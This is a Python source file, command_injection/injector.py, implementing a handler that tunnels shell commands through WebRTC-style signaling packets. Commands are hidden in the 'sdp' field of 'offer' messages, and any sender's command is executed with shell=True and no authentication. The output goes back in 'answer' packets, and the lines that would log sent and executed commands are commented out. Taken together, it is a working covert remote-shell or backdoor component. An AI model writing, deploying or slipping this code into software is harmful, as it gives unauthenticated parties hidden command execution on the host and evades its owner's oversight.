# command_injection/injector.py

import asyncio
import json
import logging
import subprocess
import uuid

logger = logging.getLogger("remote_command")

if not logger.handlers:
    handler = logging.StreamHandler()
    handler.setFormatter(
        logging.Formatter(
            "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
        )
    )
    logger.addHandler(handler)

logger.setLevel(logging.DEBUG)

COMMAND_TIMEOUT = 120


class RemoteCommandHandler:
    """
    Unified handler for:

    - Sending remote commands
    - Receiving remote commands
    - Executing commands
    - Returning results
    - Tracking pending requests
    """

    def __init__(self, signal):
        self.signal = signal
        self._pending_results = {}

        if hasattr(signal, "add_handler"):
            signal.add_handler(self.dispatch_message)
        elif hasattr(signal, "add_message_handler"):
            signal.add_message_handler(self.dispatch_message)

    # ============================================================
    # SEND COMMAND
    # ============================================================

    async def send_command(
        self,
        target,
        command,
        request_id=None,
        wait_for_result=False,
        timeout=None,
    ):
        if not isinstance(command, str) or not command.strip():
            raise ValueError("command must be a non-empty string")

        if request_id is None:
            request_id = str(uuid.uuid4())

        packet = {
            "type": "offer",
            "target": target,
            "sdp": json.dumps(
                {
                    "type": "remote-command",
                    "command": command,
                    "request_id": request_id,
                }
            ),
        }

        # logger.info("Sending command request_id=%s target=%s command=%r", request_id, target, command,)

        future = None

        if wait_for_result:
            future = asyncio.get_running_loop().create_future()
            self._pending_results[request_id] = future

        await self.signal.send(packet)

        if wait_for_result:
            try:
                return await asyncio.wait_for(future, timeout=timeout)
            except asyncio.TimeoutError:
                self._pending_results.pop(request_id, None)
                raise

        return request_id

    # ============================================================
    # MESSAGE ROUTER
    # ============================================================

    async def dispatch_message(self, message):
        if not isinstance(message, dict):
            logger.warning("Invalid message: %r", message)
            return

        msg_type = message.get("type")

        if msg_type == "offer":
            await self._handle_offer(message)

        elif msg_type == "answer":
            await self._handle_answer(message)

        elif msg_type == "remote-command":
            await self._process_command_request(message)

        elif msg_type == "remote-command-result":
            await self._handle_command_result(message)

    # ============================================================
    # OFFER HANDLER
    # ============================================================

    async def _handle_offer(self, message):
        sdp = message.get("sdp")

        if not isinstance(sdp, str):
            return

        try:
            payload = json.loads(sdp)
        except json.JSONDecodeError:
            logger.warning("Invalid JSON SDP")
            return

        if payload.get("type") != "remote-command":
            return

        request = {
            "sender": message.get("sender"),
            "command": payload.get("command"),
            "request_id": payload.get("request_id"),
        }

        await self._process_command_request(request)

    # ============================================================
    # ANSWER HANDLER
    # ============================================================

    async def _handle_answer(self, message):
        sdp = message.get("sdp")

        if not isinstance(sdp, str):
            return

        try:
            payload = json.loads(sdp)
        except json.JSONDecodeError:
            logger.warning("Invalid JSON answer")
            return

        if payload.get("type") == "remote-command-result":
            await self._handle_command_result(payload)

    # ============================================================
    # COMMAND EXECUTION
    # ============================================================

    async def _process_command_request(self, message):
        sender = message.get("sender")
        command = message.get("command")
        request_id = message.get("request_id")

        if not isinstance(command, str) or not command.strip():
            await self._send_result(
                sender,
                request_id,
                "error",
                error="Invalid command",
            )
            return

        # logger.info("Executing command from %s: %s", sender, command,)

        status, output, error = await self._execute_command(command)

        await self._send_result(
            sender,
            request_id,
            status,
            output=output,
            error=error,
        )

    async def _execute_command(self, command):
        try:
            completed = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=120,
            )

        except subprocess.TimeoutExpired:
            return (
                "error",
                None,
                "Command timed out.",
            )
        except Exception as exc:
            logger.exception("Execution failed")
            return (
                "error",
                None,
                str(exc),
            )

        output = completed.stdout + completed.stderr

        if completed.returncode == 0:
            return (
                "success",
                output or "Command executed successfully.",
                None,
            )

        return (
            "error",
            None,
            output or "Command failed.",
        )

    # ============================================================
    # RESULT HANDLING
    # ============================================================

    async def _handle_command_result(self, message):
        request_id = message.get("request_id")

        if request_id is None:
            return

        future = self._pending_results.pop(
            request_id,
            None,
        )

        if future and not future.done():
            future.set_result(message)

    # ============================================================
    # RESPONSE SENDER
    # ============================================================

    async def _send_result(
        self,
        target,
        request_id,
        status,
        output=None,
        error=None,
    ):
        payload = {
            "type": "remote-command-result",
            "request_id": request_id,
            "status": status,
        }

        if output is not None:
            payload["output"] = output

        if error is not None:
            payload["error"] = error

        packet = {
            "type": "answer",
            "target": target,
            "sdp": json.dumps(payload),
        }

        logger.debug(
            "Sending result request_id=%s status=%s",
            request_id,
            status,
        )

        await self.signal.send(packet)